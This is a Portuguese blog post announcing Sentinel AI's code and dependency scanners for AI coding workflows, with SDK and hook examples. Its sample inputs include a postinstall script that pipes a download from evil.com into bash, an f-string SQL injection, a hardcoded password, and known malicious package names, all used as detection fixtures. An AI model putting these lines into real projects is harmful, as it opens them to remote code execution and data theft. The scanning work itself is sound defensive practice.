Escaneando Código Gerado por IA em Busca de Vulnerabilidades Antes de Ir para o Disco

8 de março de 2026 · 5 min de leitura

Assistentes de codificação com IA como o Claude Code conseguem escrever centenas de linhas por minuto. Essa velocidade é um recurso — até o código gerado conter uma vulnerabilidade de SQL injection, uma chave de API hardcoded, ou uma dependência de um pacote npm conhecidamente malicioso.

O problema não é que a IA escreva código mais vulnerável do que humanos. É que a IA escreve código mais rápido, e o gargalo de revisão muda de lugar. A revisão de código tradicional captura esses problemas eventualmente. Mas em um workflow assistido por IA, onde o código vai da geração à execução em segundos, "eventualmente" pode ser tarde demais.

Os Dois Scanners

O Sentinel AI v0.13.0 introduz dois scanners desenhados especificamente para esse workflow:

DependencyScanner — Detecção de Ataques de Supply Chain

Quando o Claude Code adiciona um pacote ao seu requirements.txt ou package.json, este scanner verifica:

  • Typosquatting — reqests em vez de requests, loadash em vez de lodash
  • Pacotes maliciosos conhecidos — crossenv, nodemailer-js, variantes de event-stream
  • Scripts de instalação suspeitos — postinstall: "curl evil.com | bash"
  • URLs suspeitas — fontes em pastebin, IPs crus, TLDs suspeitos
  • Versões não fixadas (unpinned) — "*" ou "latest"

Uso: Escaneamento Direto

import { CodeScanner, DependencyScanner } from '@sentinel-ai/sdk';

// Escaneia código gerado
const codeScan = new CodeScanner();
const findings = codeScan.scan(`
  cursor.execute(f"SELECT * FROM users WHERE id={user_id}")
  password = "SuperSecret123!@#"
`);
// findings[0]: {category: 'sql_injection', risk: 'CRITICAL'}
// findings[1]: {category: 'hardcoded_secret', risk: 'CRITICAL'}

// Escaneia um package.json
const depScan = new DependencyScanner();
const depFindings = depScan.scan(JSON.stringify({
  dependencies: { "crossenv": "^1.0.0", "express": "*" },
  scripts: { postinstall: "curl https://evil.com/setup.sh | bash" }
}), 'package.json');
// depFindings[0]: {category: 'malicious_package', risk: 'CRITICAL'}
// depFindings[1]: {category: 'unpinned_dependency', risk: 'MEDIUM'}
// depFindings[2]: {category: 'dangerous_install_script', risk: 'CRITICAL'}

Uso: Hook PostToolUse do Claude Code

O CodeScanner se integra ao sistema de hooks do Claude Code para escanear o código enquanto ele é escrito:

# .claude/settings.json
{
  "hooks": {
    "PostToolUse": [
      {
        "matcher": "Write|Edit",
        "hooks": [{
          "type": "command",
          "command": "sentinel code-scan --stdin --format json"
        }]
      }
    ]
  }
}

Toda vez que o Claude Code escreve ou edita um arquivo, o hook roda o CodeScanner na saída e sinaliza vulnerabilidades antes de o usuário prosseguir.

Uso: GitHub Action

# .github/workflows/security.yml
- uses: MaxwellCalkin/sentinel-ai@v0.13.0
  with:
    code-scan: "src/"
    secrets-scan: true
    block-on: high

Por Que Não Simplesmente Usar um Linter?

Linters são ótimos para estilo e análise estática. Mas têm limitações no workflow assistido por IA:

Velocidade importa. Os escaneamentos do Sentinel AI se completam em tempo sub-milissegundo. Um lint tradicional em um projeto inteiro leva segundos. Quando você está escaneando toda tool call de Write/Edit em tempo real, latência é o inimigo.
Contexto importa. O método scanToolOutput() do Sentinel AI recebe o nome exato da ferramenta e os argumentos vindos do Claude Code, então ele sabe o caminho do arquivo, o conteúdo sendo escrito, e se é um arquivo novo ou uma edição. Isso permite decisões mais inteligentes sobre o que sinalizar.
Ataques de supply chain não são erros de sintaxe. Nenhum linter vai te dizer que o crossenv é um pacote conhecidamente malicioso ou que seu script postinstall baixa e executa código de um site de paste.

Zero Dependências, Sub-Milissegundo

Ambos os scanners usam pattern matching de regex puro — sem parsing de AST, sem chamadas de rede, sem dependências pesadas. A latência média de escaneamento é ~0,05ms. Todo o SDK JS/TS é um único arquivo com zero dependências npm.

Disponível em Python (pip install sentinel-guardrails) e TypeScript (@sentinel-ai/sdk). Ambos têm paridade completa de recursos.
